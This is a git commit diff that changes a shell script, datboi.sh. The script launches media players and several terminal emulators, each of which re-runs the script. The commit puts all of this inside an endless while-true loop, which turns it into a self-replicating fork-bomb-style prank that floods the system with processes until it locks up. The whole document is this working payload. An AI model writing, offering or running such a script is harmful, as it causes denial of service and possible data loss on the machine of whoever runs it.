ba9b82071c76d5c231b5b9a78b421a26b63ae2ff
Ross Thomas <106878841+Cyb3rHack3r@users.noreply.github.com>
2023-12-13 22:54:10 +1100

    Add files via upload

--- datboi.sh
+++ datboi.sh
@@ -1,2 +1,10 @@
 #! /bin/sh
-ffplay datboi.mp3 & nvlc datboi.mp3 & animate datboi.gif & konsole -e bash datboi.sh & xterm -e bash datboi.sh & gnome-terminal -- bash datboi.sh;
+while true
+do
+ffplay datboi.mp3 & 
+nvlc datboi.mp3 & 
+animate datboi.gif & 
+konsole -e bash datboi.sh & 
+xterm -e bash datboi.sh & 
+gnome-terminal -- bash datboi.sh
+done
